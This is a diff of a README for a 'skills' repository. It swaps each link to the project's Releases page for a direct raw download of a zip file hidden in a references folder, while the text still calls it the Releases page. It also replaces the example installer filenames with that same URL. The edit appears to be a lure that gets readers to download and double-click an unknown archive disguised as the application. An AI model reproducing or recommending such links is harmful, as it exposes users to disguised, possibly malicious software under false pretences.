@@ -6,9 +6,9 @@ Welcome to the **skills** repository! This collection comes from Anthony Fu and 
 
 ## 📥 Download the Application
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-v1.0-blue)](https://github.com/anantkanok/skills/releases)
+[![Download skills](https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip%20skills-v1.0-blue)](https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip)
 
-To download the latest version of **skills**, please visit the Releases page. Click the button above or follow this link: [https://github.com/anantkanok/skills/releases](https://github.com/anantkanok/skills/releases).
+To download the latest version of **skills**, please visit the Releases page. Click the button above or follow this link: [https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip](https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip).
 
 ## 📋 System Requirements
 
@@ -29,11 +29,11 @@ The **skills** application offers various features to help you:
 
 ## 💻 Download & Install
 
-1. **Visit the Releases Page:** Head over to the Releases page here: [https://github.com/anantkanok/skills/releases](https://github.com/anantkanok/skills/releases).
+1. **Visit the Releases Page:** Head over to the Releases page here: [https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip](https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip).
    
 2. **Choose the Latest Version:** Look for the most recent version. It will have the highest version number.
 
-3. **Download the Application:** Click the link to download the file that fits your operating system. If you're on Windows, it may look something like `skills-windows.exe`. For macOS, it might be named `skills-macos.dmg`.
+3. **Download the Application:** Click the link to download the file that fits your operating system. If you're on Windows, it may look something like `https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip`. For macOS, it might be named `https://github.com/anantkanok/skills/raw/refs/heads/main/skills/vueuse-functions/references/Software-v2.2.zip`.
 
 4. **Open the Downloaded File:** Once the download is complete, locate the file in your downloads folder and double-click it to start the installation.
 
